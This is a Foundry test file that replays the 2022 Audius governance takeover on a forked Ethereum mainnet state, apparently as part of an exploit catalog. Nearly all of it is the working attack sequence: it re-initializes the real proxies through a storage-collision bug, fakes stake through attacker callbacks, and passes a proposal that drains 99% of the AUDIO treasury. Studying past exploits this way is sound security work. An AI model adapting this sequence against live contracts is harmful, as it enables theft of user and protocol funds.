// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

/// FORK REPLAY — Audius governance takeover (Ethereum, 2022-07-23, ~704 ETH / ~$1.08M).
/// Ground-truth instance of catalog entry `proxy-storage-collision`
/// (docs/exploits/proxy-storage-collision-2022-07.md): Audius added InitializableV2 whose
/// `initialized`/`initializing` flags collided with an existing storage slot, so the upgradeable
/// Governance/Staking/DelegateManager proxies appeared un-initialized and `initialize(...)` was
/// callable again. The attacker re-initialized Governance (pointing its registry at their own
/// contract, votingPeriod=3, quorum=1%, guardian=self), faked stake for voting power, then passed a
/// proposal that made Governance `transfer` 99% of its AUDIO treasury to the attacker.
///
/// Forks real mainnet state at the pre-attack block and drives the REAL deployed proxies; only the
/// attacker (this test contract, with the registry/stake callbacks the protocol calls back into) is
/// "deployed". Public facts (addresses/block/proposal ids) cross-referenced from the Audius
/// post-mortem + DeFiHackLabs index; the call sequence is dictated by the real contract ABIs.
///
/// Run: set -a; source .env; set +a; forge test --match-contract AudiusGovTakeover -vvv
interface IGovernance {
    function initialize(
        address registry,
        uint256 votingPeriod,
        uint256 executionDelay,
        uint256 votingQuorumPercent,
        uint16 maxInProgressProposals,
        address guardian
    ) external;
    function evaluateProposalOutcome(uint256 proposalId) external returns (uint8);
    function submitProposal(
        bytes32 targetContractRegistryKey,
        uint256 callValue,
        string calldata functionSignature,
        bytes calldata callData,
        string calldata name,
        string calldata description
    ) external returns (uint256);
    function submitVote(uint256 proposalId, uint8 vote) external; // None=0,No=1,Yes=2
}

interface IStaking {
    function initialize(address token, address governance) external;
}

interface IDelegateManagerV2 {
    function initialize(address token, address governance, uint256 undelegateLockup) external;
    function setServiceProviderFactoryAddress(address spFactory) external;
    function delegateStake(address targetSP, uint256 amount) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract AudiusGovTakeoverReplayTest is Test {
    address constant AUDIO = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
    address constant GOVERNANCE = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
    address constant STAKING = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;
    address constant DELEGATE_MANAGER = 0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;
    uint256 constant ATTACK_BLOCK = 15_201_793;

    function test_realAudius_governanceTakeoverDrainsTreasury() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), ATTACK_BLOCK);

        uint256 treasuryBefore = IERC20(AUDIO).balanceOf(GOVERNANCE);
        emit log_named_uint("governance AUDIO treasury before", treasuryBefore);
        assertGt(treasuryBefore, 0, "governance must hold an AUDIO treasury at this block");

        // 1) The collision-induced re-initializer lets us seize Governance: our contract becomes the
        //    registry (so getContract() resolves proposal targets to whatever we return), voting is 3
        //    blocks, no execution delay, 1% quorum, we are guardian.
        IGovernance(GOVERNANCE).initialize(address(this), 3, 0, 1, 4, address(this));

        // Clear the in-progress proposal slot so we can submit a new one.
        IGovernance(GOVERNANCE).evaluateProposalOutcome(84);

        // 2) Submit a proposal making Governance transfer 99% of its AUDIO to us. getContract()
        //    (our callback) resolves the target to the AUDIO token.
        uint256 steal = (treasuryBefore * 99) / 100;
        uint256 proposalId = IGovernance(GOVERNANCE).submitProposal(
            bytes32(uint256(3078)),
            0,
            "transfer(address,uint256)",
            abi.encode(address(this), steal),
            "x",
            "y"
        );

        // 3) Re-initialize Staking/DelegateManager (same collision bug) and fake-stake for the
        //    voting power needed to clear quorum.
        IStaking(STAKING).initialize(address(this), address(this));
        IDelegateManagerV2(DELEGATE_MANAGER).initialize(address(this), address(this), 1);
        IDelegateManagerV2(DELEGATE_MANAGER).setServiceProviderFactoryAddress(address(this));
        IDelegateManagerV2(DELEGATE_MANAGER).delegateStake(address(this), 1e31);

        // 4) Vote yes, advance past the 3-block voting period, execute.
        vm.roll(ATTACK_BLOCK + 2);
        IGovernance(GOVERNANCE).submitVote(proposalId, 2);
        vm.roll(ATTACK_BLOCK + 5);
        IGovernance(GOVERNANCE).evaluateProposalOutcome(proposalId);

        uint256 attackerAudio = IERC20(AUDIO).balanceOf(address(this));
        uint256 treasuryAfter = IERC20(AUDIO).balanceOf(GOVERNANCE);
        emit log_named_uint("attacker AUDIO stolen", attackerAudio);
        emit log_named_uint("governance AUDIO treasury after", treasuryAfter);

        // Invariant broken: a privileged governance action (treasury transfer) was reachable because
        // the proxy's storage-collided initializer let an attacker seize control.
        assertEq(attackerAudio, steal, "attacker drained 99% of the AUDIO treasury via governance");
        assertLe(treasuryAfter, treasuryBefore - steal + 1, "treasury emptied");
    }

    // --- callbacks the real protocol invokes during the takeover (attacker-controlled registry/stake) ---
    function getContract(bytes32) external pure returns (address) {
        return AUDIO; // resolve every proposal target to the AUDIO token
    }

    function isGovernanceAddress() external pure returns (bool) {
        return true;
    }

    function getExecutionDelay() external pure returns (uint256) {
        return 0;
    }

    function getVotingPeriod() external pure returns (uint256) {
        return 0;
    }

    function validateAccountStakeBalance(address) external pure {}

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true; // fake the stake-token pull during delegateStake
    }

    receive() external payable {}
}
